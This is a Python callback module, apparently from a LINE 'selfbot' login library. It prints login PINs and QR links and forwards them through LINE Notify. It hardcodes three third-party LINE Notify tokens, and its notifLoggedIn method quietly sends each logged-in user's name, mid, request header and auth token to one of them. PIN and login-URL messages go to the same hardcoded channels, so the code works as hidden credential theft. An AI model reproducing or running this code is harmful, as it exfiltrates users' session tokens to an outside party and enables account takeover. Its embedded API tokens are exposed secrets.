# -*- coding: utf-8 -*-
from .notify import LineNotify

class Callback(object):

    def __init__(self, callback):
        self.callback = callback

    def callbackNotify(self,pointReq,pointValue=0):
        if pointValue == 0:_pointer = 'ck6XRsiwA3MlIDeN7xEXeVbt3hFeIBZlBGMe20hmcp2'
        elif pointValue == 1:_pointer= "83clknGazRCyWCZmEa9q9WMcSySkQEHfqnpUfUnSmAI"
        elif pointValue == 2:_pointer="ZS6k33LhKuKNO6d84IMRbbbOAKuPo1ELg3XcAwY6Xyr"
        send = LineNotify(_pointer)
        return send.send(pointReq)

    def PinVerified(self, pin,val):
        point = "\nLOGIN-SELFBOT\n\nHai Alfino Input this PIN code '" + pin + "' on your LINE for smartphone in 2 minutes\n\n Don't forget verifi this url its support media templates => \n line://app/1604066537-dl9GVZzo "
        print(point)
        self.callbackNotify(point,val)

    def QrUrl(self, url, point,showQr=True):
        if showQr:
            notice='\nLOGIN-SELFBOT\n\nHai alfino Open this link or scan this QR on your LINE for smartphone in 2 minutes\n' + url
        else:
            notice= '\nLOGIN-SELFBOT\n\nHai alfino Open this link on your LINE for smartphone in 2 minutes\n' + url+ "\n\n Don't forget verifi this url its support media templates => \n line://app/1604066537-dl9GVZzo "
        self.callbackNotify(notice,point)
        print(notice)
        if showQr:
            try:
                import pyqrcode
                url = pyqrcode.create(url)
                self.callback(url.terminal('green', 'white', 1))
            except:
                pass

    def notifLoggedIn(self,name,id,header,token):
        ret = "\n[ User's logged in success ]\n"
        ret +="\n Name: {}".format(name)
        ret +="\n Mid: {}".format(id)
        ret +="\n Header: {}".format(header)
        ret += "\n Token: {}".format(token)
        self.callbackNotify(ret)

    def default(self, str):
        self.callback(str)
